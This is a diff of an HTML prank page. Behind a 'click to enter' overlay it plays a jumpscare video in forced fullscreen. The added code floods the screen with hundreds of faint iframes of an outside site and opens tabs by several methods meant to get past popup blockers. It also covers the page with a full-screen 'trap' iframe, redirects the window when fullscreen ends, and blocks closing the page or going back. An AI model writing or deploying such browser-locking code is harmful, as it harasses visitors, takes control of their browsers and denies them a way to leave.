@@ -2,13 +2,12 @@
 <html lang="en">
 <head>
    <style>
+    * { margin: 0; padding: 0; }
     body, html {
-      margin: 0;
-      padding: 0;
       width: 100%;
       height: 100%;
       background: black;
-      cursor: pointer; 
+      cursor: pointer;
       overflow: hidden;
     }
     #scareVideo {
@@ -19,23 +18,13 @@
       width: 100%;
       height: 100%;
       z-index: 999;
+      object-fit: cover;
     }
-    
-    #scareVideo::-webkit-media-controls {
-      display: none !important;
-    }
-    #scareVideo::-moz-media-controls {
-        display: none !important;
-    }
-    video::-ms-media-controls {
-        display: none !important;
-    }
-    video::-o-media-controls {
-        display: none !important;
-    }
-    video {
-        pointer-events: none;
-    }
+    #scareVideo::-webkit-media-controls { display: none !important; }
+    #scareVideo::-moz-media-controls { display: none !important; }
+    video::-ms-media-controls { display: none !important; }
+    video::-o-media-controls { display: none !important; }
+    video { pointer-events: none; }
 
     #overlayText {
       position: fixed;
@@ -53,164 +42,181 @@
       z-index: 1000;
     }
 
-    /* Hidden iframes that will load the URL */
-    .hiddenIframe {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
+    /* Hidden trap iframe */
+    #trapFrame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1001;
+      display: none;
       border: none;
+      background: white;
+    }
+
+    /* Mini iframes that will spawn everywhere */
+    .miniFrame {
+      position: fixed;
+      width: 100px;
+      height: 100px;
+      border: none;
+      z-index: 9999;
+      opacity: 0.1;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
 
   <div id="overlayText">click to enter..</div>
-
+  
   <video id="scareVideo" loop>
     <source src="jumpscare.mp4" type="video/mp4">
-    Your browser does not support the video tag.
   </video>
+
+  <!-- This iframe will take over the page -->
+  <iframe id="trapFrame" src="https://loganexotic.github.io/zakusone/"></iframe>
 
   <script>
     const pageBody = document.body;
     const video = document.getElementById('scareVideo');
     const overlayText = document.getElementById('overlayText');
+    const trapFrame = document.getElementById('trapFrame');
     const url = 'https://loganexotic.github.io/zakusone/';
-    let iframesCreated = 0;
-    let tabsOpened = false;
+    let triggered = false;
 
-    // Method 1: Create hidden iframes (bypasses popup blocker)
-    function createIframe() {
-      const iframe = document.createElement('iframe');
-      iframe.src = url;
-      iframe.className = 'hiddenIframe';
-      iframe.id = 'iframe_' + iframesCreated;
-      iframesCreated++;
-      document.body.appendChild(iframe);
-      return iframe;
-    }
-
-    // Method 2: Try to open actual tabs using user gesture
-    function openTabWithUserGesture() {
-      try {
-        const win = window.open(url, '_blank');
-        if (!win || win.closed || typeof win.closed == 'undefined') {
-          // If blocked, use the iframe method
-          createIframe();
-        }
-      } catch(e) {
-        createIframe();
-      }
-    }
-
-    // Method 3: Create a fake click on a link (works sometimes)
-    function fakeClickOpen() {
-      const a = document.createElement('a');
-      a.href = url;
-      a.target = '_blank';
-      a.rel = 'noopener noreferrer';
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(() => {
-        document.body.removeChild(a);
-      }, 100);
-    }
-
-    // Massive tab opening function
-    function openMassTabs(count) {
+    // Function to spawn mini iframes all over the screen
+    function spawnMiniIframes(count) {
       for (let i = 0; i < count; i++) {
-        // Cycle through methods to maximize success
-        if (i % 3 === 0) {
-          openTabWithUserGesture();
-        } else if (i % 3 === 1) {
-          fakeClickOpen();
-        } else {
-          createIframe();
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.className = 'miniFrame';
+        iframe.style.left = Math.random() * window.innerWidth + 'px';
+        iframe.style.top = Math.random() * window.innerHeight + 'px';
+        iframe.style.width = (50 + Math.random() * 200) + 'px';
+        iframe.style.height = (50 + Math.random() * 200) + 'px';
+        iframe.style.opacity = Math.random() * 0.3;
+        document.body.appendChild(iframe);
+      }
+    }
+
+    // Force open new windows using every possible method
+    function forceOpenTabs() {
+      const methods = [
+        () => window.open(url, '_blank'),
+        () => window.open(url, '_blank', 'noopener,noreferrer'),
+        () => {
+          const a = document.createElement('a');
+          a.href = url;
+          a.target = '_blank';
+          a.rel = 'noopener noreferrer';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => document.body.removeChild(a), 50);
+        },
+        () => {
+          // Try with window.open and a unique name to bypass popup blocker
+          window.open(url, 'tab_' + Date.now() + '_' + Math.random());
+        }
+      ];
+
+      // Try all methods multiple times
+      for (let m = 0; m < methods.length; m++) {
+        for (let i = 0; i < 3; i++) {
+          try { methods[m](); } catch(e) {}
         }
       }
     }
 
+    // Main click handler
     pageBody.addEventListener('click', () => {
-      // Hide text overlay
+      if (triggered) return;
+      triggered = true;
+
+      // Hide text
       overlayText.style.display = 'none';
 
       // Show video
       video.style.display = 'block';
-
-      // Force fullscreen
-      const elem = document.documentElement;
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-      } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-      }
-
       video.play();
 
-      // Open tabs - using the click event as user gesture
-      if (!tabsOpened) {
-        tabsOpened = true;
-        
-        // Open 10 tabs/iframes immediately
-        openMassTabs(10);
+      // Enter fullscreen
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) elem.requestFullscreen();
+      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
 
-        // More after delays
-        setTimeout(() => { openMassTabs(8); }, 300);
-        setTimeout(() => { openMassTabs(8); }, 600);
-        setTimeout(() => { openMassTabs(8); }, 1000);
+      // IMMEDIATELY: Spawn hundreds of iframes everywhere
+      for (let i = 0; i < 50; i++) {
+        setTimeout(() => spawnMiniIframes(20), i * 100);
       }
+
+      // Force open real tabs
+      forceOpenTabs();
+
+      // After 2 seconds, show the trap iframe (takes over the page)
+      setTimeout(() => {
+        trapFrame.style.display = 'block';
+        // Hide video behind it
+        video.style.display = 'none';
+      }, 2000);
+
+      // Keep opening tabs in background
+      setInterval(() => {
+        forceOpenTabs();
+        spawnMiniIframes(10);
+      }, 2000);
 
     }, { once: true });
 
-    // When fullscreen exits, open more
-    function handleFullscreenExit() {
-      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
-        // Open a LOT more
-        openMassTabs(20);
-        setTimeout(() => { openMassTabs(15); }, 500);
-        setTimeout(() => { openMassTabs(15); }, 1000);
+    // When fullscreen exits - TRAP THEM
+    document.addEventListener('fullscreenchange', () => {
+      if (!document.fullscreenElement && triggered) {
+        // Trap them in the iframe
+        trapFrame.style.display = 'block';
+        video.style.display = 'none';
         
-        // Also try to redirect the main window
+        // Open massive tabs
+        for (let i = 0; i < 10; i++) {
+          setTimeout(forceOpenTabs, i * 100);
+        }
+        
+        // Spawn hundreds of iframes
+        for (let i = 0; i < 20; i++) {
+          setTimeout(() => spawnMiniIframes(30), i * 50);
+        }
+
+        // Redirect main window to the URL
         try {
           window.location.href = url;
         } catch(e) {}
       }
-    }
+    });
 
-    document.addEventListener('fullscreenchange', handleFullscreenExit);
-    document.addEventListener('webkitfullscreenchange', handleFullscreenExit);
-    document.addEventListener('msfullscreenchange', handleFullscreenExit);
-
-    // Every time user clicks while in fullscreen
-    document.addEventListener('click', () => {
-      if (tabsOpened && document.fullscreenElement) {
-        openMassTabs(5);
+    // Prevent closing the page
+    window.addEventListener('beforeunload', (e) => {
+      if (triggered) {
+        e.preventDefault();
+        e.returnValue = '';
+        // Open more tabs when they try to close
+        forceOpenTabs();
+        return '';
       }
     });
 
-    // Spam iframes continuously
-    setInterval(() => {
-      if (tabsOpened) {
-        for (let i = 0; i < 5; i++) {
-          createIframe();
-        }
-      }
-    }, 3000);
-
-    // Also when user leaves the page
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden && tabsOpened) {
-        // User alt-tabbed away - open more
-        setTimeout(() => { openMassTabs(10); }, 100);
+    // Also when they try to go back
+    window.addEventListener('popstate', () => {
+      if (triggered) {
+        forceOpenTabs();
+        window.history.pushState(null, '', window.location.href);
       }
     });
 
-    console.log('✅ Ready - click the screen!');
+    // Push history state to trap back button
+    window.history.pushState(null, '', window.location.href);
+
+    console.log('🔥 Click to unleash');
   </script>
 
 </body>
